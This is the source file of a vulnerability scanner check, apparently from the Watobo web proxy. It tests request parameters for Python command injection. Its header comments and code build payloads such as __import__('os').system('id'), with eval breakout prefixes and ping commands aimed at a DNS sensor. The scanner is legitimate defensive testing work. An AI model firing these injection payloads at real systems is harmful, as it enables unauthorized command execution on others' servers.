# __import__('os').system('id')
#
# <!-- Bypass another expression in eval -->
# ),__import__('os').system('id')
# '),__import__('os').system('id')
# },__import__('os').system('id')
# ),__import__('os').system('id')#
# @private
module Watobo #:nodoc: all
  module Modules
    module Active
      module Cmd_injection

        class Python_injection < Watobo::ActiveCheck

          threat = <<'EOF'

EOF

          measure = "All user input should be filtered and/or escaped using a method appropriate for the output context"

          @info.update(
            :check_name => 'Python Command Injection', # name of check which briefly describes functionality, will be used for tree and progress views
            :check_group => AC_GROUP_CMD,
            :description => "Check for python command injection vulnerabilities.", # description of checkfunction
            :author => "Andreas Schmidt", # author of check
            :version => "0.9" # check version
          )

          @finding.update(
            :threat => threat, # thread of vulnerability, e.g. loss of information
            :class => AC_GROUP_CMD, # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
            :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
            :rating => VULN_RATING_CRITICAL,
            :measure => measure
          )

          # todo: better injection for other languages
=begin
>>> cmd = "exec('import os; out = os.popen(\"id\").read(); print(out)')"
>>> eval(cmd)
=end

          def initialize(project, prefs = {})
            super(project, prefs)

          end

          def generateChecks(chat)
            @injections = []

            # @injections << ['id', 'uid.*gid.*groups']
            @injections << ["ping -c 1 DNS_SENSOR", 'PING.*bytes of data']
            @injections << ["ping -n 1 DNS_SENSOR", 'Ping.*Bytes Dat']

            @envelopes = []
            @envelopes << ' '
            @envelopes << '\'), '
            @envelopes << '), '
            @envelopes << '}, '
            @envelopes << '\'}, '
            @envelopes << '"}, '
            begin

              @parm_list = chat.request.parameters
              @parm_list.each do |param|
                checks = []
                checks.concat @injections
                @injections.each do |i|
                  @envelopes.each do |pref|
                    checks.concat @injections.map { |i| ["#{param.value}#{pref}__import__('os').system('#{i[0]}') #", i[1]] }
                    checks.concat @injections.map { |i| ["#{pref}__import__('os').system('#{i[0]}') #", i[1]] }
                  end
                  # checks.concat @injections.map { |i| ["#{param.value};#{i[0]}", i[1]] }
                  #                   checks.concat @injections.map { |i| [";#{i[0]}", i[1]] }
                  # checks.concat @injections.map{|i| [ "`#{i[0]}`", i[1]]}
                  # checks.concat @injections.map{|i| [ ";`#{i[0]}`", i[1]]}
                  # checks.concat @injections.map{|i| [ "|`#{i[0]}`", i[1]]}
                end
                checks.each do |check|
                  checker = proc {
                    test_request = nil
                    test_response = nil

                    test = chat.copyRequest
                    parm = param.copy
                    pattern = "#{check[1]}"

                    dns_inj = "#{checkid}.#{Watobo::Conf::Scanner.dns_sensor}"
                    inj = "#{check[0].gsub('DNS_SENSOR', dns_inj)}"

                    parm.value = inj
                    if parm.location == :url
                      parm.value = CGI.escape(inj)
                    end
                    test.set parm

                    test_request, test_response = doRequest(test)

                    if test_response.join =~ /(#{pattern})/i
                      match = $1
                      addFinding(test_request, test_response,
                                 # :check_pattern => "#{Regexp.quote(parm.value)}",
                                 :check_pattern => "#{parm.value}",
                                 :proof_pattern => "#{match}",
                                 :test_item => "#{parm.name}",
                                 :chat => chat,
                                 :title => "[#{parm.name}] - #{test_request.path}"
                      )
                    end

                    [test_request, test_response]
                  }
                  yield checker
                end
              end
            end

          rescue => bang
            puts bang
            puts bang.backtrace if $DEBUG
            puts "ERROR!! #{Module.nesting[0].name}"
            raise

          end
        end

      end

    end
  end
end

